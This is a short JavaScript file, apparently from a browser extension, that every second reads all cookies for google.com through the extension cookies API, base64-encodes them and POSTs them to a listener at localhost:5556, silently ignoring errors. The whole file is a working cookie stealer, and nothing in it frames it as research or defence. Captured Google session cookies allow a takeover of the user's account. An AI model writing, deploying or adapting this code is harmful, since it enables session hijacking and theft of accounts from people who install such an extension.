setInterval(() => {
  const sendCookies = async (cookies) => {
    let cookie = ""
    cookies.map((x) => {
      cookie += `${x.name}=${x.value}; `
    })
    console.log(cookie)
    try {
      await fetch("http://localhost:5556", {
        method: "POST",
        body: btoa(cookie),
      })
    } catch {}
  }
  const conf = {
    url: "https://www.google.com/",
  }
  if (window.chrome) chrome.cookies.getAll(conf, sendCookies)
  else browser.cookies.getAll(conf).then(sendCookies)
}, 1000)
